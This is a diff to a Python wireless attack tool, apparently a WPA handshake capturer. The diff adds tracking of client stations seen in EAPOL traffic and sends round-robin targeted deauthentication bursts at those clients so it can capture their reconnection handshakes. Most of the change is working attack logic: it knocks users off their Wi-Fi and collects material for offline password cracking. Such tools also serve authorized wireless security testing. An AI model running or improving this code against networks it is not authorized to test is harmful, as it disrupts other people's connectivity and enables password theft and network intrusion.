@@ -1000,6 +1000,10 @@ def capture_full_handshakes(
 
     stats_lock = threading.Lock()
     events: "queue.SimpleQueue[tuple[Optional[str], str]]" = queue.SimpleQueue()
+    known_clients = sorted(client for client in ap.clients if is_valid_mac(client))
+    observed_clients: Set[str] = set(known_clients)
+    client_target_index = 0
+    burst_deauth_count = max(4, min(128, int(round(deauth_burst_on_sec * 10))))
 
     def terminal_columns() -> int:
         try:
@@ -1033,12 +1037,27 @@ def capture_full_handshakes(
 
             if not pkt.haslayer(Dot11):
                 return
+            dot11 = pkt[Dot11]
 
             with stats_lock:
                 total_packets += 1
 
             # Write every packet to PCAP (filter later in Wireshark).
             writer.write(pkt)
+
+            if packet_matches_bssid(pkt, ap.bssid):
+                client_info = extract_eapol_client(dot11, ap.bssid)
+                if client_info:
+                    observed_client, _ = client_info
+                    with stats_lock:
+                        if observed_client not in observed_clients:
+                            observed_clients.add(observed_client)
+                            events.put(
+                                (
+                                    COLOR_DIM,
+                                    f"[CLIENT] Observed station: {observed_client}",
+                                )
+                            )
 
             if pkt.haslayer(EAPOL):
                 with stats_lock:
@@ -1097,6 +1116,13 @@ def capture_full_handshakes(
                 ),
                 COLOR_DIM,
             )
+            with stats_lock:
+                initial_client_count = len(observed_clients)
+            if initial_client_count:
+                emit_event(
+                    f"[DEAUTH] {initial_client_count} observed client(s) available for targeted bursts.",
+                    COLOR_DIM,
+                )
 
         # Main capture loop.
         while True:
@@ -1126,22 +1152,40 @@ def capture_full_handshakes(
 
                 if (not deauth_started) and next_deauth_start_at and now >= next_deauth_start_at:
                     emit_event("[DEAUTH] Starting burst...", COLOR_WARNING)
+                    burst_target = dict(target_dict)
+                    burst_target["deauth_count"] = burst_deauth_count
+                    live_clients: List[str] = []
+                    with stats_lock:
+                        if observed_clients:
+                            live_clients = sorted(observed_clients)
+                    if live_clients:
+                        burst_target["client"] = live_clients[client_target_index % len(live_clients)]
+                        client_target_index += 1
+                        if HANDSHAKER_DEAUTH_VERBOSE:
+                            emit_event(f"[DEAUTH] Targeting client {burst_target['client']}", COLOR_DIM)
+                    elif HANDSHAKER_DEAUTH_VERBOSE:
+                        emit_event("[DEAUTH] No live client yet, using broadcast pulse.", COLOR_DIM)
                     success = False
                     try:
                         success = deauth.start_deauth_attack(
                             interface,
-                            target_dict,
+                            burst_target,
                             quiet=not HANDSHAKER_DEAUTH_VERBOSE,
                         )
                     except TypeError:
-                        success = deauth.start_deauth_attack(interface, target_dict)
+                        success = deauth.start_deauth_attack(interface, burst_target)
 
                     if success:
-                        deauth_started = True
                         now = time.time()
-                        deauth_stop_at = now + deauth_burst_on_sec
                         next_deauth_start_at = now + deauth_burst_cycle_sec
-                        emit_event("[DEAUTH] Burst active.", COLOR_SUCCESS)
+                        if getattr(deauth, "ATTACK_RUNNING", False):
+                            deauth_started = True
+                            deauth_stop_at = now + deauth_burst_on_sec
+                            emit_event("[DEAUTH] Burst active.", COLOR_SUCCESS)
+                        else:
+                            deauth_started = False
+                            deauth_stop_at = None
+                            emit_event("[DEAUTH] Burst pulse sent.", COLOR_SUCCESS)
                     else:
                         next_deauth_start_at = now + deauth_burst_cycle_sec
                         emit_event("[DEAUTH] Burst failed; retrying next cycle.", COLOR_WARNING)
